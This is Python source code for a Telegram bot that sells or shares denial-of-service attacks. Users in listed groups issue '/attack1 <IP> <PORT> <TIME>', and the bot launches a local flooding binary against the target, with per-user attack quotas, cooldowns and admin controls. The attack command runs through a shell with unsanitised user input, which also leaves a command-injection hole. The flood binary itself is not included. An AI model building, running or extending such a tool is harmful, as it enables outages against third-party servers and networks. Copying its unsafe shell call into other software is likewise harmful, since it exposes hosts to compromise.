import telebot
import datetime
import time
import subprocess
import threading

from keep_alive import keep_alive
keep_alive()
# Insert your Telegram bot token here
bot = telebot.TeleBot('YOUR_BOT_TOKEN_HERE')

# Admin user IDs
admin_id = ["7409754329"]

# Owner user IDs
owner_id = ["7409754328"]

# Owner username
OWNER_USERNAME = "@SHIVAMXRAJ"

# Group and channel details
GROUP_IDS = ["-1002410640320", "-1002177231516"]
CHANNEL_USERNAME = "@GODCRACKSS"

# Default cooldown and attack limits
COOLDOWN_TIME = 150  # Cooldown in seconds
ATTACK_LIMIT = 10  # Max attacks per day
SPAM_COOLDOWN_TIME = 120  # Spam penalty cooldown in seconds
SPAM_THRESHOLD = 3  # Number of spam attempts before penalty
MAX_ATTACK_TIME = 100  # Maximum attack time in seconds

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}

# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset, spam_cooldown = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None,
                    'spam_count': 0,
                    'spam_cooldown': datetime.datetime.fromisoformat(spam_cooldown) if spam_cooldown != "None" else None
                }
    except FileNotFoundError:
        pass

# Function to save user data to the file
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            spam_cooldown = data['spam_cooldown'].isoformat() if data['spam_cooldown'] else "None"
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()},{spam_cooldown}\n")

# Middleware to ensure users are joined to the channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# Command to handle attacks
@bot.message_handler(commands=['attack1'])
def handle_attack(message):
    user_id = str(message.from_user.id)

    # Ensure user is in one of the groups
    if message.chat.id not in [int(group_id) for group_id in GROUP_IDS]:
        bot.reply_to(message, "This bot can only be used in the specified groups. Join - https://t.me/GODDDOSFREE")
        return

    # Ensure user is a member of the channel
    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"You must join {CHANNEL_USERNAME} to use this bot.")
        return

    # Initialize user data if not present
    if user_id not in user_data:
        user_data[user_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None,
            'spam_count': 0,
            'spam_cooldown': None
        }

    user = user_data[user_id]

    # Check spam cooldown
    if user['spam_cooldown'] and (datetime.datetime.now() - user['spam_cooldown']).seconds < SPAM_COOLDOWN_TIME:
        remaining_time = SPAM_COOLDOWN_TIME - (datetime.datetime.now() - user['spam_cooldown']).seconds
        bot.reply_to(message, f"You have been penalized for spamming. Wait {remaining_time} seconds.")
        return

    # Check user-specific cooldown
    if user['last_attack'] and (datetime.datetime.now() - user['last_attack']).seconds < COOLDOWN_TIME:
        user['spam_count'] += 1
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - user['last_attack']).seconds
        bot.reply_to(message, f"Wait {remaining_time} seconds before attacking again.")
        
        # If spamming detected, apply penalty
        if user['spam_count'] >= SPAM_THRESHOLD:
            user['spam_cooldown'] = datetime.datetime.now()
            bot.reply_to(message, f"You are temporarily blocked for spamming. Wait {SPAM_COOLDOWN_TIME // 60} minutes.")
        return
    else:
        # Reset spam count if enough time has passed
        user['spam_count'] = 0

    # Check user's daily attack limit
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, f"You have reached your daily attack limit of {ATTACK_LIMIT}. Try again tomorrow.")
        return

    # Parse command arguments
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack1 <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "Error: PORT and TIME must be integers.")
        return

    if time_duration > MAX_ATTACK_TIME:
        bot.reply_to(message, f"Error: Attack duration cannot exceed {MAX_ATTACK_TIME} seconds.")
        return

    # Execute the attack via the binary
    full_command = f"./shivam {target} {port} {time_duration} 600"
    try:
        bot.reply_to(message, f"Attack started on Target: {target}, Port: {port}, Time: {time_duration} seconds.\n"
                              f"Remaining attacks for you: {ATTACK_LIMIT - user['attacks'] - 1}")
        subprocess.run(full_command, shell=True)
        bot.reply_to(message, f"Attack completed on Target: {target}, Port: {port}, Time: {time_duration} seconds.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred while executing the attack: {str(e)}")
        return

    # Update user data
    user['attacks'] += 1
    user['last_attack'] = datetime.datetime.now()
    save_users()

# Command to set maximum attack time
@bot.message_handler(commands=['set_time'])
def set_max_time(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /set_time <seconds>")
        return

    global MAX_ATTACK_TIME
    try:
        MAX_ATTACK_TIME = int(command[1])
        bot.reply_to(message, f"Maximum attack time has been set to {MAX_ATTACK_TIME} seconds.")
    except ValueError:
        bot.reply_to(message, "Please provide a valid number of seconds.")

# Command to remove spam cooldown
@bot.message_handler(commands=['remove_cooldown'])
def remove_cooldown(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /remove_cooldown <user_id>")
        return

    user_id = command[1]
    if user_id in user_data:
        user_data[user_id]['spam_cooldown'] = None
        save_users()
        bot.reply_to(message, f"Spam cooldown removed for user {user_id}.")
    else:
        bot.reply_to(message, f"No data found for user {user_id}.")

# Command to display help menu
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = """
Available Commands:
/attack1 <IP> <PORT> <TIME> - Initiate an attack.
/check_cooldown - Check your cooldown status.
/check_remaining_attack - Check your remaining daily attacks.
/remove_cooldown <user_id> - Admin command to remove spam cooldown.
/reset <user_id> - Admin command to reset attack limits.
/setcooldown <seconds> - Admin command to change the global cooldown time.
/set_time <seconds> - Admin command to set the maximum attack time.
/viewusers - Admin command to view all users and their attack data.
/ping - Show the bot's current ping.
/owner - Execute owner-specific commands.
/help - Show this help menu.
"""
    bot.reply_to(message, help_text)

# Command to show ping
@bot.message_handler(commands=['ping'])
def show_ping(message):
    start_time = time.time()
    bot.reply_to(message, "Pinging...")
    end_time = time.time()
    ping = round((end_time - start_time) * 1000)  # Convert to milliseconds
    bot.reply_to(message, f"Pong! Current ping is {ping} ms.")

# Command for owner-specific actions
@bot.message_handler(commands=['owner'])
def owner_commands(message):
    if str(message.from_user.id) not in owner_id:
        bot.reply_to(message, "Only the owner can use this command.")
        return

    bot.reply_to(message, f"Welcome, {OWNER_USERNAME}. Owner-specific actions can be executed here.")

# Other unchanged code...
